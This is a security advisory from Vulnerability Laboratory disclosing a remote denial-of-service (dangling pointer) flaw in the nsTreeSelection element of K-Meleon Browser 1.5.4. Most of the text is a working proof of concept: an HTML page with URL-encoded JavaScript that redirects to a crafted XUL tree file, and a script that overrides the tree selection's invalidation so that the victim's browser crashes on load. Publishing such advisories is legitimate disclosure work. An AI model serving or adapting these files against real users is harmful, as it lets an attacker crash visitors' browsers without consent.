Abstract:
=========
Vulnerability Laboratory Research Team discovered a remote Dangle pointer (Denial of Service) Vulnerability on K-Meleon Browser v1.5.4.


Report-Timeline:
================
2012-04-14:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Medium


Details:
========
A denial of service vulnerability is detected on K-Meleon Browser v1.5.4 . The vulnerability allows 
an attacker to form manipulated files to crash th victims browser stable when processing to request.
The null pointer dos vulnerability is located nsTreeSelection element. Successful exploitation results
in a stable (bex exception) application (StackHash_2c85) crash.

Vulnerable Module(s):
				[+] nsTreeSelection element

Picture(s):
				../1.png
				../2.png
				../3.png


Proof of Concept:
=================
The vulnerability can be exploited by remote attackers. Victim only need to visit the 
malicious file (frame-class.html) to crash stable. For demonstration or reproduce ...

frame-class.html
<script language=JavaScript>m='%3Chtml%3E%0A%3Capplet%20code%3D%22hexHEX.class%22%20width
%3D100%20height%3D140%3E%3C/applet%3E%0A%3Cscript%3Edocument.location%3D%22tree.xul%22%3C/
script%3E%0A%3C/html%3E';d=unescape(m);document.write(d);</script>


tree.xul
<?xml version="1.0"?>
<?xml-stylesheet href="chrome://global/skin/" type="text/javascript"?>
<window
  id="poc-test"
  title="TESTING EXPLOIT"
  orient="vertical"
  xmlns="http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul" onload="doSelect()">
<script src="rem0ve.js"/> 
 <tree id="penetrationtest" rows="1" onselect="doSelect()">
<treechildren>  
  <treeitem container="true" open="true">
    <treerow>  
<treecell label="rem0ve@...nerability-lab.com"/>  
    </treerow>  
  </treeitem>  
</treechildren>  
 </tree>
</window>



rem0ve.js
function Init()
{
var tree=document.getElementById('penetrationtest');
tree.view.selection.select(0);
doSelect();
}
function doSelect()
{
  var tree=document.getElementById('penetrationtest');
  var sel = tree.view.selection;
  sel.tree = { invalidateRange: function(v,l)
  {
	sel.clearSelection();
	}
  }
}
setTimeout("Init()",500);


Risk:
=====
The security risk of the denial of service vulnerability is estimated as medium(-).
